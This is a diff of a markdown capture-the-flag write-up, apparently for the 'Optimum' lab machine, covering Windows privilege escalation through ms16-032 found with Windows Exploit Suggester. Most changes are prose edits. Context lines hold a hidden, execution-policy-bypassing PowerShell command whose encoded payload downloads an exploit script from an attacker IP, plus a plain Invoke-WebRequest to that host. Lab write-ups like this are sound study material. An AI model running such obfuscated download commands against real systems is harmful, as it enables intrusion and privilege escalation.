@@ -44,6 +44,8 @@ PS C:\Users\Administrator> dir /a:h
 
 ```
 
+I could see the `Administrator` directory, but not read it. That's fine, but worth checking.
+
 I did some basic enum:
 
 ```cmd
@@ -162,7 +164,7 @@ Hyper-V Requirements:      A hypervisor has been detected. Features required for
 
 ## Searching for an Exploit
 
-I ran Windows exploit suggester using this info:
+I ran Windows exploit suggester using this info (I set this up in [[15 - Shell as Network Service#Windows Exploit Suggester|Granny]]):
 
 ```bash
 ┌──(mac㉿kali)-[~/Documents/enum/Windows-Exploit-Suggester]
@@ -288,7 +290,9 @@ Payloads all the things also has a good [list of kernel exploits](https://github
 
 We can't use the potato exploits as we don't have either of the necessary privs, but we can look at ms16-032: [https://www.exploit-db.com/exploits/39719](https://www.exploit-db.com/exploits/39719)
 
-It's also on our local box:
+As usual, there is a bit of messing about trying to find the correct one and [[15 - Shell as kostas#Attempting File Transfer|transfer the file]], but you can [[15 - Shell as kostas#Final Exploit|skip to the final exploit]] if you wish.
+
+ms16-032 is also on our local box:
 
 ```bash
 ┌──(mac㉿kali)-[~/Documents/HTB/optimum]
@@ -366,6 +370,8 @@ Which means our command should be:
 ```cmd
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAyADEAMQAvAGUAeABwAC4AcABzADEAIAAtAG8AIABlAHgAcAAuAHAAcwAxAA==
 ```
+
+But this also didn't work to download our exploit.
 
 I thought maybe I needed the full path, so went hunting on google: [https://stackoverflow.com/questions/4145232/path-to-powershell-exe-v-2-0](https://stackoverflow.com/questions/4145232/path-to-powershell-exe-v-2-0)
 
@@ -446,9 +452,11 @@ However, I noticed I seemed to be *in* a powershell shell (denoted by the `PS` s
 PS C:\Users\kostas\Desktop> Invoke-WebRequest http://10.10.16.211/test
 ```
 
-And suddenly it worked! I guess trying to run powershell.exe inside a powershell prompt was messing things up:
+And suddenly it worked!
 
 ![[Pasted image 20210613124656.png]]
+
+I guess trying to run powershell.exe inside a powershell prompt was messing things up.
 
 ### Trying the Exploit
 
@@ -528,6 +536,8 @@ I ran the exploit again:
 And after 30 seconds or so I got a hit!
 
 ![[Pasted image 20210613135029.png]]
+
+## Final Exploit
 
 Now I had to try and run my exploit again. Just `exp.exe` didn't work, but specifying the full path did:
 
